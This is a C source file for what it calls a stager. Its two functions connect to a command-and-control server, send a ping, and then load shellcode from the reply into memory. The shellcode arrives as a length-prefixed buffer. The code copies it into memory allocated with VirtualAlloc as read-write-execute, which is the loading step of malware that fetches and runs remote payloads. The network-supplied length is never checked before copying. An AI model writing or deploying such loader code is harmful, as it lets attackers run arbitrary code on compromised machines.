#include "stager.h"


// Establish connection to server and send ping
int connect_c2( struct addrinfo* ptr, struct addrinfo *result, SOCKET* ConnectSocketAddr)
{

	int iResult = 0; // return value

	// data to send to server
	// TODO:  make this some form of verification or send some host info?

	const char* ping = "ping";


	// Attempt to connect to c2 server
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
	{
		// Create socket for connecting to server
		*ConnectSocketAddr = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (*ConnectSocketAddr == INVALID_SOCKET)
		{
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return -1;
		}

		// Connect to server
		iResult = connect(*ConnectSocketAddr, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR)
		{
			closesocket(*ConnectSocketAddr);
			*ConnectSocketAddr = INVALID_SOCKET;
			continue;
		}
		break;
	}

	// free result struct
	freeaddrinfo(result);

	if (*ConnectSocketAddr == INVALID_SOCKET)
	{
		printf("Unable to connect to server\n");
		WSACleanup();
		return -1;
	}


	// Send initial message to server
	iResult = send(*ConnectSocketAddr, ping, (int)strlen(ping), 0);
	if (iResult == SOCKET_ERROR)
	{
		printf("send failed with error: %d\n", WSAGetLastError());
		closesocket(*ConnectSocketAddr);
		WSACleanup();
		return -1;
	}

	printf("Sent ping to server\n");

	// shutdown socket - won't send anymore data
	// TODO:  ack receipt of shellcode?
	iResult = shutdown(*ConnectSocketAddr, SD_SEND);
	if (iResult == SOCKET_ERROR)
	{
		printf("Shutdown of socket fialed with error: %d\n", WSAGetLastError());
		closesocket(*ConnectSocketAddr);
		WSACleanup();
		return -1;
	}

	printf("Connected to C2 Server\n");
	return 0;

}


// Allocate memory for shellcode in own process and copy it in there
int prep_stage(char* recvbuf, LPVOID* memory_buffer)
{
	
	char* received_shellcode = (char*) calloc(DEFAULT_BUFLEN - 4, sizeof(char));
	int* received_shellcode_len = (int*) calloc(1, sizeof(int));
	int shellcode_len = 0;
	
	// copy shellcode length from received data
	memcpy(received_shellcode_len, recvbuf, 4);

	// convert shellcode len to host byte order
	shellcode_len = ntohl(*received_shellcode_len);
	printf("Length of shellcode: %d\n", shellcode_len);
	
	// copy shellcode into buffer
	memcpy(received_shellcode, recvbuf + 4, shellcode_len);
	
	// Print hex bytes of shellcode
	printf("Received following payload:\n");
	for (int i = 0; i < shellcode_len; i++)
	{
		printf("%hhX", received_shellcode[i]);
	}
	printf("\n");


	// Allocate memory for shellcode to be executed
	*memory_buffer = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (*memory_buffer == NULL)
	{
		printf("Failed to allocate memory in self\n");
		return -1;
	}
	else {
		printf("Allocated buffer of length %d in own process at addr 0x%p\n", shellcode_len, *memory_buffer);
	}

	// Copy shellcode into buffer
	printf("Copying shellcode into buffer...\n");
	memcpy(*memory_buffer, received_shellcode, shellcode_len);

	// clean up
	free(received_shellcode_len);
	free(received_shellcode);

	return 0;
}
